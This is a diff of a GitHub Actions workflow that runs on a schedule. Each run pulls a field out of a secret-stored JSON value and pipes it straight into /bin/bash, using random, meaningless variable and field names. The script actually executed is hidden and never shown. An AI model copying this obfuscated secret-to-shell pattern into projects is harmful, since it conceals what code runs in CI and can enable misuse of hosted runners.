@@ -1,9 +1,8 @@
 name: pengzhongzhou2013
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '55 2/6 * * *'
+    - cron: '29 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,14 +10,21 @@ jobs:
       - uses: actions/checkout@v4
       - name: pengzhongzhou2013
         env:
-          dooc13965: ${{ secrets.dooc13965 }}
+          p88: ${{ secrets.p88 }}
         run: |
-          echo $dooc13965 | jq -r .sl092 | /bin/bash
-          echo $pngk8219 | jq -r .nesv51209 | /bin/bash
-          echo $cqba34 | jq -r .yw8478 | /bin/bash
-          echo $gvhmp343 | jq -r .jjre3 | /bin/bash
-          echo $ye3 | jq -r .ao7 | /bin/bash
-          echo $zgp74622 | jq -r .rgavu445 | /bin/bash
-          echo $kz73 | jq -r .hgoe95308 | /bin/bash
-          echo $nqag20898 | jq -r .nbom36408 | /bin/bash
+          echo $p88 | jq -r .wox49 | /bin/bash
+          echo $hb91672 | jq -r .z38 | /bin/bash
+          echo $pz36219 | jq -r .cpj1051 | /bin/bash
+          echo $k78 | jq -r .cv98 | /bin/bash
+          echo $zqmy6093 | jq -r .hvv28 | /bin/bash
+          echo $r9 | jq -r .ah3 | /bin/bash
+          echo $nqg21 | jq -r .iombu501 | /bin/bash
+          echo $hfynj89 | jq -r .jolp8 | /bin/bash
+          echo $a17594 | jq -r .lhwc558 | /bin/bash
+          echo $kon23 | jq -r .wxnsk8 | /bin/bash
+          echo $chvfl0 | jq -r .w351 | /bin/bash
+          echo $a511 | jq -r .qlwhp13 | /bin/bash
+          echo $uyfo31 | jq -r .rvg771 | /bin/bash
+          echo $yng2401 | jq -r .jqz30277 | /bin/bash
+          echo $iu86 | jq -r .s3957 | /bin/bash
 
